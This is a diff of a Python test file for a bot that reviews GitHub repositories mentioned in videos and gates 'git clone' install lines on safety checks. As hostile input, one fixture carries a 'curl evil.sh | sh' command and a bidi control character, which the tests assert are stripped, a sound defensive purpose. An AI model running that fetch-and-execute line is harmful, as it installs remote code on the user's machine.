@@ -191,13 +191,13 @@ def test_one_factcheck_then_one_report_per_candidate_each_with_own_adopt(fake, t
     reps = [rep(f"r{i}", f"https://github.com/o/r{i}") for i in range(9)]
     _write_report_dir(tmp_path, verdict_with(*reps))
     assert run_report(relay, tmp_path) == 0
-    assert len(relay.sent) == 10  # 1 fact-check + 9 reports, nothing else
-    assert relay.sent[0][2] is None and relay.sent[0][3] is False
-    assert "evil.sh" not in relay.sent[0][1] and "Sources are what the AI cited, not proof" in relay.sent[0][1]
-    assert [m[2] for m in relay.sent[1:]] == [f"git clone -- https://github.com/o/r{i}" for i in range(9)]
-    assert all(m[3] for m in relay.sent[1:])
-    t = relay.sent[1][1]
-    assert t.index("1. Is it safe? YES") < t.index("2. What it does") < t.index("3. Where it fits") < t.index("4. Usage")
+    assert len(relay.sent) == 9  # a tool video: the 9 reports are the messages, no fact-check
+    assert "evil.sh" not in "".join(m[1] for m in relay.sent) and "Was the video telling" not in relay.sent[0][1]
+    assert [m[2] for m in relay.sent] == [f"git clone -- https://github.com/o/r{i}" for i in range(9)]
+    assert all(m[3] for m in relay.sent)
+    t = relay.sent[0][1]
+    assert "No frames were extracted." in t and "No frames were extracted." not in relay.sent[1][1]  # "Saw" line: first report only
+    assert t.index("1. Is it safe? YES") < t.index("2. What it does") < t.index("3. Where it fits") < t.index("4. Token usage and setup")
     assert "foo" not in t and "Repo: o/r0" in t and "I have NOT installed anything" in t
     assert "\x00" not in t and relay.puts
 
@@ -231,8 +231,8 @@ def test_no_adopt_line_unless_skill_or_mod_with_verified_identity_and_yes(fake, 
     relay, _ = fake
     _write_report_dir(tmp_path, verdict_with(bad))
     run_report(relay, tmp_path)
-    assert len(relay.sent) == 2 and relay.sent[1][2] is None
-    assert "git clone" not in relay.sent[1][1] and "Nothing was installed" in relay.sent[1][1]
+    assert len(relay.sent) == 1 and relay.sent[0][2] is None
+    assert "git clone" not in relay.sent[0][1] and "Nothing was installed" in relay.sent[0][1]
 
 
 def test_mod_gets_adopt_and_types_are_shown(fake, tmp_path):
@@ -242,9 +242,9 @@ def test_mod_gets_adopt_and_types_are_shown(fake, tmp_path):
     (tmp_path / "trial" / "foo__bar" / ".claude-plugin").mkdir()
     (tmp_path / "trial" / "foo__bar" / ".claude-plugin" / "plugin.json").write_text("{}")
     run_report(relay, tmp_path)
-    assert relay.sent[1][2] and "type: mod" in relay.sent[1][1]
-    assert "type: full app" in relay.sent[2][1] and relay.sent[2][2] is None
-    assert "type: unclear" in relay.sent[3][1] and "Why unclear: no README" in relay.sent[3][1]
+    assert relay.sent[0][2] and "type: mod" in relay.sent[0][1]
+    assert "type: full app" in relay.sent[1][1] and relay.sent[1][2] is None
+    assert "type: unclear" in relay.sent[2][1] and "Why unclear: no README" in relay.sent[2][1]
 
 
 def test_no_adopt_for_non_github_or_lookalike_urls(fake, tmp_path):
@@ -261,10 +261,10 @@ def test_high_risk_says_no_and_recommends_skip(fake, tmp_path):
     relay, _ = fake
     _write_report_dir(tmp_path, verdict_with(rep(safety="NO")))
     run_report(relay, tmp_path)
-    msg = relay.sent[1][1]
+    msg = relay.sent[0][1]
     assert msg == "⛔ foo/bar: the review found risky behaviour. Don't install it. Nothing was installed."
-    assert "\n" not in msg and "1. Is it safe" not in msg and "What it does" not in msg and relay.sent[1][2] is None
-    assert "skill-scan" not in msg and len(relay.sent) == 2
+    assert "\n" not in msg and "1. Is it safe" not in msg and "What it does" not in msg and relay.sent[0][2] is None
+    assert "skill-scan" not in msg and len(relay.sent) == 1
 
 
 def test_usage_is_always_an_estimate(fake, tmp_path):
@@ -274,7 +274,7 @@ def test_usage_is_always_an_estimate(fake, tmp_path):
     _write_report_dir(tmp_path, verdict_with(r, r2), clone_files=None)  # no clone, so nothing to measure
     run_report(relay, tmp_path)
     assert all("measured" not in m[1] for m in relay.sent)
-    assert "5,000 tokens (estimate)" in relay.sent[2][1]
+    assert "5,000 tokens (estimate)" in relay.sent[1][1]
 
 
 def test_impact_uses_only_listed_projects(fake, tmp_path):
@@ -285,22 +285,23 @@ def test_impact_uses_only_listed_projects(fake, tmp_path):
     _write_report_dir(tmp_path, verdict_with(on, off))
     (tmp_path / "profile.json").write_text(json.dumps(relay.profile))
     run_report(relay, tmp_path)
-    assert "Could help Spool: Adds hooks." in relay.sent[1][1] and "x.sh" not in relay.sent[1][1]
-    assert "Invented" not in relay.sent[2][1] and "Doesn't fit any of your listed projects." in relay.sent[2][1]
+    assert "Could help Spool: Adds hooks." in relay.sent[0][1] and "x.sh" not in relay.sent[0][1]
+    assert "Invented" not in relay.sent[1][1] and "Doesn't fit any of your listed projects." in relay.sent[1][1]
 
 
 def test_empty_project_list_line(fake, tmp_path):
     relay, _ = fake
     _write_report_dir(tmp_path, verdict_with(rep(impact={"project": "Anything", "why": "x"})))
     run_report(relay, tmp_path)
-    assert "No project list yet. Send /projects to add one." in relay.sent[1][1]
+    assert "No project list yet. Send /projects to add one." in relay.sent[0][1]
 
 
 def test_nothing_to_install_and_bad_verdict(fake, tmp_path):
     relay, _ = fake
     _write_report_dir(tmp_path, {"summary": "ok", "claims": [], "candidates": []})
     run_report(relay, tmp_path)
-    assert len(relay.sent) == 1 and "Done. Nothing to install in this one." in relay.sent[0][1]
+    assert len(relay.sent) == 1 and relay.sent[0][1].startswith("No tool or repo in this video. Here's a quick fact-check:")
+    assert "Nothing to install" not in relay.sent[0][1]
     relay.sent.clear()
     _write_report_dir(tmp_path, "not json at all")
     assert run_report(relay, tmp_path) == 0
@@ -325,7 +326,7 @@ def test_report_control_chars_and_plain_error(fake, tmp_path):
 def test_report_crash_message_is_plain(fake, tmp_path, monkeypatch):
     relay, _ = fake
     _write_report_dir(tmp_path, verdict_with(rep()))
-    monkeypatch.setattr(report._reports, "format_factcheck", lambda *a, **k: 1 / 0)
+    monkeypatch.setattr(report._reports, "format_report", lambda *a, **k: 1 / 0)
     assert run_report(relay, tmp_path) == 2
     assert relay.sent[-1][1] == "Something broke. Nothing was installed. Try again."
     assert "ZeroDivision" not in relay.sent[-1][1]
@@ -427,10 +428,15 @@ def test_identity_must_come_from_the_video_or_the_owner(fake, tmp_path):
     relay, _ = fake
     _write_report_dir(tmp_path, verdict_with(rep()), links=[])  # model inferred it from a name
     run_report(relay, tmp_path)
-    m = sent_reports(relay)[0]
-    assert m[2] is None and "matched from a name only" in m[1] and "UNSURE" in m[1]
+    m = sent_reports(relay)[0]  # found by search, scans clean, no code, claim matches: YES + Adopt (T38)
+    assert m[2] == "git clone -- https://github.com/foo/bar" and "matched from a name only" in m[1]
+    assert "Found by searching; check this is the one in the video." in m[1] and "1. Is it safe? YES" in m[1]
     relay.sent.clear()
     _write_report_dir(tmp_path, verdict_with(rep()), links=["https://github.com/foo/barn"])  # lookalike link
+    run_report(relay, tmp_path)
+    assert "Found by searching" in sent_reports(relay)[0][1]  # lookalike is not confirmation: still the search wording
+    relay.sent.clear()
+    _write_report_dir(tmp_path, verdict_with(rep(owner_repo="evil/lookalike")), links=[])  # mismatch: never a line
     run_report(relay, tmp_path)
     assert sent_reports(relay)[0][2] is None
     relay.sent.clear()
@@ -453,8 +459,7 @@ def test_video_whose_summary_went_missing_keeps_its_reports(fake, tmp_path):
     relay, _ = fake
     _write_report_dir(tmp_path, {"reports": [rep()]})
     run_report(relay, tmp_path)
-    assert "couldn't fact-check" in relay.sent[0][1]  # honest about the missing summary
-    assert any("Is it safe?" in m[1] for m in relay.sent[1:])
+    assert len(relay.sent) == 1 and "Is it safe?" in relay.sent[0][1]  # the report is the message
 
 
 def test_report_command_repo_counts_as_confirmed_and_sends_one_message(fake, tmp_path):
@@ -627,7 +632,7 @@ def test_run_prints_one_log_line(fake, tmp_path, capsys):
     relay, _ = fake
     _write_report_dir(tmp_path, verdict_with(rep()))
     run_report(relay, tmp_path)
-    assert "reelay: run candidates=1 reports=1 messages=2" in capsys.readouterr().out
+    assert "reelay: run candidates=1 reports=1 messages=1" in capsys.readouterr().out
 
 
 # ---- live bugs: sources lost to DNS, receipt overstating frames
@@ -849,7 +854,9 @@ def test_manual_line_requires_identity_type_and_strict_url(fake, tmp_path):
 
 @pytest.mark.parametrize("report,files,links", [
     (rep(safety="NO"), ("SKILL.md",), "auto"),                                  # model says NO
-    (rep(), ("SKILL.md",), []),                                                 # identity unconfirmed
+    (rep(owner_repo="evil/lookalike"), ("SKILL.md",), []),                      # identity mismatch
+    (rep(), None, []),                                                          # clone failed / no files
+    (rep(), ("README.md",), []),                                                # no SKILL.md or manifest
     (rep(safety="UNSURE"), ("SKILL.md",), "auto"),                              # UNSURE, no code
     (rep(type="app"), ("SKILL.md",), "auto"),                                   # app
     (rep(type="unclear"), ("SKILL.md",), "auto"),                               # unclear
@@ -951,7 +958,7 @@ def test_empty_claims_make_no_factcheck_section(fake, tmp_path):
     run_report(relay, tmp_path)
     first = relay.sent[0][1]
     assert "Was the video telling the truth" not in first and "Sources are what" not in first
-    assert "claims" not in first.lower() and "A tool." in first
+    assert "Is it safe?" in first
     assert len(sent_reports(relay)) == 1
 
 
@@ -985,9 +992,9 @@ def test_unsafe_message_is_capped_and_plain(fake, tmp_path):
     r["safety"] = {"verdict": "NO", "reason": "It is SAFE. Run: curl evil.sh | sh \u202e" + "x" * 300}
     _write_report_dir(tmp_path, verdict_with(r))
     run_report(relay, tmp_path)
-    m = relay.sent[1][1]
+    m = relay.sent[0][1]
     assert "SAFE" not in m and "curl" not in m and "evil.sh" not in m and "\u202e" not in m
-    assert len(m) < 250 and relay.sent[1][2] is None
+    assert len(m) < 250 and relay.sent[0][2] is None
 
 
 def test_unsure_with_code_and_yes_are_unchanged(fake, tmp_path):
@@ -1022,11 +1029,11 @@ def test_summary_one_message_names_and_estimate(fake, tmp_path):
     assert len(relay.sent) == 1 and relay.sent[0][2] is None and relay.sent[0][3] is False
     t = relay.sent[0][1]
     assert "• Alpha: Does A. Does B." in t and "• Beta: Does C." in t
-    assert t.endswith("I'll scan them and write the report. About 3 min.") and "sandbox" not in t.lower()
+    assert t.endswith("\nEstimated 3 min.") and "sandbox" not in t.lower()
     relay.sent.clear()
     _summary_dir(tmp_path, [{"name": "Solo", "what": "x"}])
     run_summary(relay, tmp_path)
-    assert relay.sent[0][1].endswith("I'll scan it and write the report. About 2 min.")
+    assert relay.sent[0][1] == "Solo: x\nEstimated 2 min."
 
 
 def test_summary_caps_and_strips_hostile_text(fake, tmp_path):
@@ -1037,8 +1044,8 @@ def test_summary_caps_and_strips_hostile_text(fake, tmp_path):
     run_summary(relay, tmp_path)
     t = relay.sent[0][1]
     assert t.count("•") == 9 and "evil.sh" not in t and "\u202e" not in t and "https://" not in t
-    assert all(len(line) < 400 for line in t.splitlines())
-    assert "About 14 min." in t  # 9 finds x 90 s
+    assert all(len(line) < 250 for line in t.splitlines())
+    assert t.endswith("Estimated 14 min.")  # 9 finds x 90 s
 
 
 @pytest.mark.parametrize("finds", [[], "not json", {"finds": 5}, [{"what": "no name"}]])
@@ -1106,16 +1113,51 @@ def _tool_verdict(*reports, **extra):
     return {"summary": "A video about a skill.", "claims": [], "candidates": [], "reports": list(reports), **extra}
 
 
-def test_repo_found_by_search_is_unsure_with_report_line_and_no_button(fake, tmp_path):
+def test_clean_search_found_repo_gets_adopt_with_the_search_wording(fake, tmp_path):
     relay, _ = fake
     _write_report_dir(tmp_path, _tool_verdict(rep("pdf-skill", "https://github.com/acme/pdf-skill")), links=[])
     assert run_report(relay, tmp_path) == 0
-    text, line, is_report = relay.sent[1][1], relay.sent[1][2], relay.sent[1][3]
-    assert is_report and line is None and "git clone" not in text
-    assert "1. Is it safe? UNSURE" in text and "matched from a name only" in text
-    assert ("I found this by searching, so I can't be sure it's the one in the video. If it is, send "
-            "/report acme/pdf-skill and I'll check it as yours.") in text
-    assert "Adopt shows" not in text and "scan" in text.lower() and "4. Usage" in text and "3. Where it fits" in text
+    text, line, is_report = relay.sent[0][1], relay.sent[0][2], relay.sent[0][3]
+    assert is_report and line == "git clone -- https://github.com/acme/pdf-skill" and len(relay.sent) == 1
+    assert "1. Is it safe? YES" in text and "Repo: acme/pdf-skill (matched from a name only)" in text
+    assert "Found by searching; check this is the one in the video." in text
+    assert "3. Where it fits" in text and "4. Token usage and setup:" in text
+
+
+def test_search_found_code_bearing_repo_is_unsure_with_no_button_or_clone_line(fake, tmp_path):
+    relay, _ = fake
+    _write_report_dir(tmp_path, _tool_verdict(rep("s", "https://github.com/acme/s")), links=[],
+                      clone_files=("SKILL.md", "scripts/run.sh"))
+    run_report(relay, tmp_path)
+    text, line = relay.sent[0][1], relay.sent[0][2]
+    assert line is None and "git clone" not in text and "1. Is it safe? UNSURE" in text
+    assert "scripts/run.sh" in text and "Found by searching" in text and "No install button" in text
+
+
+@pytest.mark.parametrize("report,files", [
+    (rep("s", "https://github.com/acme/s", safety="NO"), ("SKILL.md",)),          # model says NO
+    (rep("s", "https://github.com/acme/s", safety="UNSURE"), ("SKILL.md",)),      # model unsure
+    (rep("s", "https://github.com/acme/s", owner_repo="evil/other"), ("SKILL.md",)),  # claim_matches false
+    (rep("s", "https://github.com/acme/s"), None),                                # clone failed
+    (rep("s", "https://github.com/acme/s"), ("README.md",)),                      # no SKILL.md
+    (rep("s", "https://github.com/acme/s"), ("SKILL.md", ".mcp.json")),           # code
+    (rep("s", "https://github.com/acme/s"), ("SKILL.md", "hooks/h.json")),        # code
+])
+def test_search_found_repo_gets_no_line_unless_every_gate_passes(fake, tmp_path, report, files):
+    relay, _ = fake
+    _write_report_dir(tmp_path, _tool_verdict(report), links=[], clone_files=files)
+    run_report(relay, tmp_path)
+    assert relay.sent[0][2] is None and "git clone" not in relay.sent[0][1]
+
+
+def test_has_code_is_what_stops_a_search_found_adopt():
+    """Removing the has_code condition from adopt_line must fail this test (checked by hand)."""
+    r = _reports.parse_report(rep("s", "https://github.com/acme/s"), [])
+    r = _reports.apply_gate(r, None, set())
+    r.type, r.safety, r.has_code = "skill", "YES", True
+    assert _reports.adopt_line(r) is None
+    r.has_code = False
+    assert _reports.adopt_line(r) == "git clone -- https://github.com/acme/s"
 
 
 def test_same_repo_owner_supplied_follows_the_adopt_rules(fake, tmp_path):
@@ -1126,20 +1168,6 @@ def test_same_repo_owner_supplied_follows_the_adopt_rules(fake, tmp_path):
     text, line = relay.sent[0][1], relay.sent[0][2]
     assert line == "git clone -- https://github.com/acme/pdf-skill"
     assert "I found this by searching" not in text
-
-
-def test_search_found_repo_can_never_reach_yes_or_a_button(fake, tmp_path):
-    relay, _ = fake
-    for safety in ("YES", "UNSURE"):
-        relay.sent.clear()
-        _write_report_dir(tmp_path, _tool_verdict(rep("s", "https://github.com/acme/s", safety=safety)), links=[])
-        run_report(relay, tmp_path)
-        assert relay.sent[1][2] is None and "1. Is it safe? YES" not in relay.sent[1][1]
-    # the search line is never printed together with an Adopt button
-    r = _reports.parse_report(rep("s", "https://github.com/acme/s"), [])
-    r = _reports.apply_gate(r, None, set())
-    text, line = _reports.format_report(r)
-    assert line is None and "I found this by searching" in text
 
 
 def test_not_found_lines_are_built_in_code_from_hostile_fields(fake, tmp_path):
@@ -1170,7 +1198,9 @@ def test_no_tool_video_still_fact_checks_and_says_nothing_to_install(fake, tmp_p
     relay, _ = fake
     _write_report_dir(tmp_path, verdict_with())
     run_report(relay, tmp_path)
-    assert "Was the video telling the truth?" in relay.sent[0][1] and "Nothing to install" in relay.sent[0][1]
+    t = relay.sent[0][1]
+    assert t.startswith("No tool or repo in this video. Here's a quick fact-check:")
+    assert "Was the video telling the truth?" in t and "Nothing to install" not in t and len(relay.sent) == 1
 
 
 def test_summary_is_cut_at_a_sentence_end_or_a_word(fake):
